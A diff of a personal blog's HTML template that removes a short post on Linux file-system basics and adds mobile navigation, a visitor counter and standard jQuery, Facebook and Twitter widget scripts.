+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_uv"> 
+    <a>「</a>本站访客数<span id="busuanzi_value_site_uv"></span>人次<a>」</a>
+    </span></div>
+  </div>
+</footer>
     </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
+    <nav id="mobile-nav">
   
-    
-    <h3 class="article-title"><a href="/2017/07/10/linux-study/"><span>Linux学习笔记</span></a></h3>
-    
+    <a href="/" class="mobile-nav-link">Home</a>
   
+    <a href="/archives" class="mobile-nav-link">Archives</a>
   
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2017/07/10/linux-study/" rel="bookmark">
-        <time class="entry-date published" datetime="2017-07-10T03:50:55.000Z">
-          2017-07-10
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p><br>    <strong>文件系统架构</strong><br></p>
-
-<ol><br>    <li><br>        Linux文件或者目录起始于根目录 &quot; / &quot; 成为树状结构，最顶层由 / 开始<br>    </li><br>    <li><br>        文件和目录名是区分大小写的<br>    </li><br>    <li><br>        路径通过 &quot; / &quot; 分开<br>    </li><br>    <li><br>        &nbsp;&quot; .. &quot; 表示上层目录<br>    </li><br>    <li><br>        &nbsp;&quot; . &quot; 表示当前目录<br>    </li><br>    <li><br>        隐藏目录或者隐藏文件名以 &quot; . &quot; 开始<br>    </li><br></ol><br>
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-      
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/漏洞研究/">漏洞研究</a>
-    </span>
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/linux/">linux</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-
-<nav class="pagination">
-  
-  <a href="/page/2/" class="pagination-prev">Prev</a>
-  
+    <a href="/yqlj" class="mobile-nav-link">Links</a>
   
 </nav>
-    </main>
 
-    <footer class="site-footer">
-  <p class="site-info">
-	<a>不要因为走了太久而忘记当初为什么出发。</a>
-    <br>
-	<a>© 2019 shiyan</a>
-	<br>
-  </p>
-</footer>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<span id="busuanzi_container_site_uv"> 
-<a>「</a>
-  本站访客数<span id="busuanzi_value_site_uv"></span>人次
-<a>  」</a>
-</span>
     
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.4";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<script src="/js/script.js"></script>
+
+
   </div>
-</div>
 </body>
 </html>
